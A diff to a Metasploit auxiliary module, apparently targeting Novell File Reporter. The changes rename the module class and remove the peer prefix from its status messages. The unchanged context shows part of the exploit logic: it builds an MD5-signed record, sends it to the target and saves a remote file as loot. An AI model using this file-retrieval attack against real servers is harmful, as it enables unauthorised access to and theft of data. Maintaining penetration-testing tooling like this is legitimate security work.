@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -51,7 +51,7 @@ class Metasploit4 < Msf::Auxiliary
     md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
     message = md5 + record
 
-    print_status("#{peer} - Retrieving the file contents")
+    print_status("Retrieving the file contents")
 
     res = send_request_cgi(
       {
@@ -66,9 +66,9 @@ class Metasploit4 < Msf::Auxiliary
       loot = $1
       f = ::File.basename(datastore['RFILE'])
       path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
-      print_status("#{peer} - #{datastore['RFILE']} saved in #{path}")
+      print_status("#{datastore['RFILE']} saved in #{path}")
     else
-      print_error("#{peer} - Failed to retrieve the file contents")
+      print_error("Failed to retrieve the file contents")
     end
   end
 
